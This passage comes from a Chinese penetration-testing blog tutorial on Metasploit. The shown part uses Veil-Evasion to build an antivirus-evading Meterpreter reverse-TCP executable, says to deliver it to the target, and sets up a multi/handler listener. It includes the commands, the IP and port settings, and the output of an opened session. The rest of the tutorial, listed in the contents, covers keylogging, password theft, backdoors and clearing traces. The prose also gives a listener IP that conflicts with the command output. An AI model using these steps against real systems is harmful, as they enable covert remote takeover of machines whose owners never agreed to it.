class="string">"Y"</span> seconds, check <span class="keyword">if</span> </span><br><span class="line">                                                                        accelerated</span><br><span class="line">TIMEZONE                X                               Optional: Check to validate not <span class="keyword">in</span> UTC</span><br><span class="line">USERNAME                X                               Optional: The required user account</span><br><span class="line">USE_ARYA                N                               Use the Arya crypter</span><br><span class="line"> Available Commands:</span><br><span class="line">     back               Go back to Veil-Evasion</span><br><span class="line">     <span class="built_in">exit</span>               Completely <span class="built_in">exit</span> Veil</span><br><span class="line">     generate           Generate the payload</span><br><span class="line">    options             Show the shellcode<span class="string">'s options</span></span><br><span class="line"><span class="string">     set                Set shellcode option</span></span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，成功配置了LHOST选项。接下来，就可以生成攻击载荷了。</p></li><li><p>生成攻击载荷。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   [cs/meterpreter/rev_tcp&gt;&gt;]: generate </span><br><span class="line">   ===================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">   ===================================================================</span><br><span class="line">    [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">===================================================================</span><br><span class="line">    [&gt;] Please enter the base name <span class="keyword">for</span> output files (default is payload):</span><br><span class="line">    [&gt;] Please enter the base name <span class="keyword">for</span> output files (default is payload): <span class="built_in">test</span>   <span class="comment">#指定一个文件名</span></span><br><span class="line">   ===================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">   ===================================================================</span><br><span class="line">         [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">===================================================================</span><br><span class="line">    [*] Language: cs</span><br><span class="line">    [*] Payload Module: cs/meterpreter/rev_tcp</span><br><span class="line">    [*] Executable written to: /var/lib/veil/output/compiled/test.exe</span><br><span class="line"> [*] Source code written to: /var/lib/veil/output/<span class="built_in">source</span>/test.cs</span><br><span class="line">    [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/test.rc</span><br><span class="line">Hit enter to <span class="built_in">continue</span>...</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，生成了一个可执行文件test.exe，并且该文件保存在/var/lib/veil/output/compiled/中。此时将可执行文件test.exe发送到目标主机上，就可以利用该攻击载荷了。<br>用户也可以在命令行模式下生成攻击载荷。这里仍然以cs/meterpreter/rev_tcp模块为例，执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 192.168.10.75 --port 4444</span></span><br><span class="line">===================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">===================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">===================================================================</span><br><span class="line">===================================================================</span><br><span class="line">                                   Veil-Evasion</span><br><span class="line">===================================================================</span><br><span class="line">      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework</span><br><span class="line">==================================================================</span><br><span class="line"> [*] Language: cs</span><br><span class="line"> [*] Payload Module: cs/meterpreter/rev_tcp</span><br><span class="line"> [*] Executable written to: /var/lib/veil/output/compiled/payload.exe</span><br><span class="line"> [*] Source code written to: /var/lib/veil/output/<span class="built_in">source</span>/payload.cs</span><br><span class="line"> [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/</span><br><span class="line">payload.rc</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，成功生成了一个可执行文件payload.exe。<br>同样，用户创建好攻击载荷文件后，还需要创建一个远程监听器。这样，当目标主机执行该攻击载荷文件后，将主动与攻击主机建立连接。使用Metasploit的exploit/multi/handler模块创建监听器如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfconsole</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/</span><br><span class="line">Display all 245 possibilities? (y or n)</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.10.75</span><br><span class="line">LHOST =&gt; 192.168.10.75</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:4444</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功创建了监听器。其中，监听的IP地址为192.168.29.134，端口为4444。此时，当目标主机执行了用户创建的攻击载荷文件test.exe，即可获取一个远程会话如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.10.75:4444 </span><br><span class="line">[*] Sending stage (208591 bytes) to 192.168.48.246</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.29.134:4444 -&gt; 192.168.48.246:45189) at 2020-12-22 16:02:22 +0800</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功获取了一个Meterpreter会话。</p></li></ol></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"><i class="fa fa-tag"></i> 漏洞利用</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2020/12/17/kali-an-zhuang-gvm-20-08-qian-openvas/" rel="next" title="Kali安装GVM 20.08（前OpenVAS）"><i class="fa fa-chevron-left"></i> Kali安装GVM 20.08（前OpenVAS）</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2020/12/31/kali2020-4-an-zhuang-sslstrip/" rel="prev" title="Kali2020.4 安装sslstrip">Kali2020.4 安装sslstrip<i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"><div class="jiathis_style"><span class="jiathis_txt">分享到：</span> <a class="jiathis_button_fav">收藏夹</a> <a class="jiathis_button_copy">复制网址</a> <a class="jiathis_button_email">邮件</a> <a class="jiathis_button_weixin">微信</a> <a class="jiathis_button_qzone">QQ空间</a> <a class="jiathis_button_tqq">腾讯微博</a> <a class="jiathis_button_douban">豆瓣</a> <a class="jiathis_button_share">一键分享</a> <a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a><a class="jiathis_counter_style"></a></div><script type="text/javascript">var jiathis_config={data_track_clickback:!0,summary:"",shortUrl:!1,hideMore:!1}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script></div></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div id="sidebar-dimmer"></div><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/chen.png" alt="Zhongzhou Chen"><p class="site-author-name" itemprop="name">Zhongzhou Chen</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives"><span class="site-state-item-count">282</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/index.html"><span class="site-state-item-count">84</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/index.html"><span class="site-state-item-count">164</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Metasploit概述"><span class="nav-text">一、Metasploit概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-什么是Metasploit"><span class="nav-text">1.1 什么是Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-渗透攻击模块"><span class="nav-text">1.1.1 渗透攻击模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-2-辅助模块"><span class="nav-text">1.1.2 辅助模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-3-后渗透攻击模块"><span class="nav-text">1.1.3 后渗透攻击模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-4-攻击载荷模块"><span class="nav-text">1.1.4 攻击载荷模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-5-空指令模块"><span class="nav-text">1.1.5 空指令模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-6-编码模块"><span class="nav-text">1.1.6 编码模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-7-规避模块"><span class="nav-text">1.1.7 规避模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-8-插件"><span class="nav-text">1.1.8 插件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Metasploit界面"><span class="nav-text">1.2 Metasploit界面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-Metasploit的图形界面Armitage"><span class="nav-text">1.2.1 Metasploit的图形界面Armitage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-Metasploit的终端Msfconsole"><span class="nav-text">1.2.2 Metasploit的终端Msfconsole</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-初始化Metasploit"><span class="nav-text">1.3 初始化Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-创建工作区"><span class="nav-text">1.4 创建工作区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-导入扫描报告"><span class="nav-text">1.5 导入扫描报告</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、查询渗透测试模块"><span class="nav-text">二、查询渗透测试模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-预分析扫描报告"><span class="nav-text">2.1 预分析扫描报告</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-手动查找攻击载荷"><span class="nav-text">2.2 手动查找攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-第三方查找"><span class="nav-text">2.3 第三方查找</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-1-通过CVE漏洞网站查找"><span class="nav-text">2.3.1 通过CVE漏洞网站查找</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-2-通过exploitDB漏洞网站查找"><span class="nav-text">2.3.2 通过exploitDB漏洞网站查找</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-3-手动导入第三方模块"><span class="nav-text">2.3.3 手动导入第三方模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、实施攻击"><span class="nav-text">三、实施攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-加载攻击载荷"><span class="nav-text">3.1 加载攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-配置攻击载荷"><span class="nav-text">3.2 配置攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-设置架构"><span class="nav-text">3.3 设置架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-设置编码"><span class="nav-text">3.4 设置编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、攻击范例"><span class="nav-text">四、攻击范例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-渗透攻击MySQL数据库服务"><span class="nav-text">4.1 渗透攻击MySQL数据库服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-渗透攻击PostgreSQL数据库服务"><span class="nav-text">4.2 渗透攻击PostgreSQL数据库服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-PDF文件攻击"><span class="nav-text">4.3 PDF文件攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-利用MS17-010漏洞实施攻击"><span class="nav-text">4.4 利用MS17_010漏洞实施攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、控制Meterpreter会话"><span class="nav-text">五、控制Meterpreter会话</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-关闭杀毒软件"><span class="nav-text">5.1 关闭杀毒软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-获取目标主机的详细信息"><span class="nav-text">5.2 获取目标主机的详细信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-检查目标是否运行在虚拟机"><span class="nav-text">5.3 检查目标是否运行在虚拟机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-访问文件系统"><span class="nav-text">5.4 访问文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-上传-下载文件"><span class="nav-text">5.5 上传/下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-6-键盘捕获"><span class="nav-text">5.6 键盘捕获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-7-屏幕截图"><span class="nav-text">5.7 屏幕截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-8-枚举用户"><span class="nav-text">5.8 枚举用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-9-权限提升"><span class="nav-text">5.9 权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-10-获取用户密码"><span class="nav-text">5.10 获取用户密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-11-绑定进程"><span class="nav-text">5.11 绑定进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-12-运行程序"><span class="nav-text">5.12 运行程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-13-启动远程桌面"><span class="nav-text">5.13 启动远程桌面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-14-持久后门"><span class="nav-text">5.14 持久后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-15-清除踪迹"><span class="nav-text">5.15 清除踪迹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-16-搭建跳板"><span class="nav-text">5.16 搭建跳板</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、免杀Payload攻击"><span class="nav-text">六、免杀Payload攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-安装及初始化Veil-Evasion工具"><span class="nav-text">6.1 安装及初始化Veil Evasion工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-生成免杀攻击载荷"><span class="nav-text">6.2 生成免杀攻击载荷</span></a></li></ol></li></ol></li></ol></div></div></section><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">Zhongzhou Chen</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span class="post-meta-item-text">Site words total count&#58;</span> <span title="Site words total count">597k</span></div><span class="post-meta-divider"></span></div></footer></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><script type="text/javascript">function proceedsearch(){$("body").append('<div class="search-popup-overlay local-search-pop-overlay"></div>').css("overflow","hidden"),$(".search-popup-overlay").click(onPopupClose),$(".popup").toggle();var t=$("#local-search-input");t.attr("autocapitalize","none"),t.attr("autocorrect","off"),t.focus()}var isfetched=!1,isXml=!0,search_path="search.xml";0===search_path.length?search_path="search.xml":/json$/i.test(search_path)&&(isXml=!1);var path="/"+search_path,onPopupClose=function(t){$(".popup").hide(),$("#local-search-input").val(""),$(".search-result-list").remove(),$("#no-result").remove(),$(".local-search-pop-overlay").remove(),$("body").css("overflow","")},searchFunc=function(t,e,s){"use strict";$("body").append('<div class="search-popup-overlay local-search-pop-overlay"><div id="search-loading-icon"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div>').css("overflow","hidden"),$("#search-loading-icon").css("margin","20% auto 0 auto").css("text-align","center"),$.ajax({url:t,dataType:isXml?"xml":"json",async:!0,success:function(t){isfetched=!0,$(".popup").detach().appendTo(".header-inner");var o=isXml?$("entry",t).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get():t,n=document.getElementById(e),r=document.getElementById(s);n.addEventListener("input",function(){var y=n.value.trim().toLowerCase(),T=y.split(/[\s\-]+/);1<T.length&&T.push(y);var b=[];if(0<y.length&&o.forEach(function(t){function e(t,e,o,n){for(var r=n[n.length-1],s=r.position,a=r.word,i=[],c=0;s+a.length<=o&&0!=n.length;){a===y&&c++,i.push({position:s,length:a.length});var l=s+a.length;for(n.pop();0!=n.length&&(s=(r=n[n.length-1]).position,a=r.word,s<l);)n.pop()}return h+=c,{hits:i,start:e,end:o,searchTextCount:c}}function o(o,t){var n="",r=t.start;return t.hits.forEach(function(t){n+=o.substring(r,t.position);var e=t.position+t.length;n+='<b class="search-keyword">'+o.substring(t.position,e)+"</b>",r=e}),n+=o.substring(r,t.end)}var n=!1,r=0,h=0,s=t.title.trim(),a=s.toLowerCase(),i=t.content.trim().replace(/<[^>]+>/g,""),c=i.toLowerCase(),l=decodeURIComponent(t.url),p=[],u=[];if(""!=s&&(T.forEach(function(t){function e(t,e,o){var n=t.length;if(0===n)return[];var r=0,s=[],a=[];for(o||(e=e.toLowerCase(),t=t.toLowerCase());-1<(s=e.indexOf(t,r));)a.push({position:s,word:t}),r=s+n;return a}p=p.concat(e(t,a,!1)),u=u.concat(e(t,c,!1))}),(0<p.length||0<u.length)&&(n=!0,r=p.length+u.length)),n){[p,u].forEach(function(t){t.sort(function(t,e){return e.position!==t.position?e.position-t.position:t.word.length-e.word.length})});var f=[];0!=p.length&&f.push(e(0,0,s.length,p));for(var d=[];0!=u.length;){var g=u[u.length-1],v=g.position,$=g.word,C=v-20,m=v+80;C<0&&(C=0),m<v+$.length&&(m=v+$.length),m>i.length&&(m=i.length),d.push(e(0,C,m,u))}d.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hits.length!==e.hits.length?e.hits.length-t.hits.length:t.start-e.start});var x=parseInt("1");0<=x&&(d=d.slice(0,x));var w="";w+=0!=f.length?"<li><a href='"+l+"' class='search-result-title'>"+o(s,f[0])+"</a>":"<li><a href='"+l+"' class='search-result-title'>"+s+"</a>",d.forEach(function(t){w+="<a href='"+l+'\'><p class="search-result">'+o(i,t)+"...</p></a>"}),w+="</li>",b.push({item:w,searchTextCount:h,hitCount:r,id:b.length})}}),1===T.length&&""===T[0])r.innerHTML='<div id="no-result"><i class="fa fa-search fa-5x" /></div>';else if(0===b.length)r.innerHTML='<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>';else{b.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hitCount!==e.hitCount?e.hitCount-t.hitCount:e.id-t.id});var e='<ul class="search-result-list">';b.forEach(function(t){e+=t.item}),e+="</ul>",r.innerHTML=e}}),$(".local-search-pop-overlay").remove(),$("body").css("overflow",""),proceedsearch()}})};$(".popup-trigger").click(function(t){t.stopPropagation(),!1===isfetched?searchFunc(path,"local-search-input","local-search-result"):proceedsearch()}),$(".popup-btn-close").click(onPopupClose),$(".popup").click(function(t){t.stopPropagation()}),$(document).on("keyup",function(t){27===t.which&&$(".search-popup").is(":visible")&&onPopupClose()})</script><script type="text/javascript" src="/js/src/clipboard.min.js"></script><script type="text/javascript" src="/js/src/clipboard-use.js"></script><script type="text/javascript" src="/js/src/love.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,log:!1,model:{jsonPath:"/live2dw/assets/shizuku.model.json"},display:{position:"right"},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.2}})</script></body></html>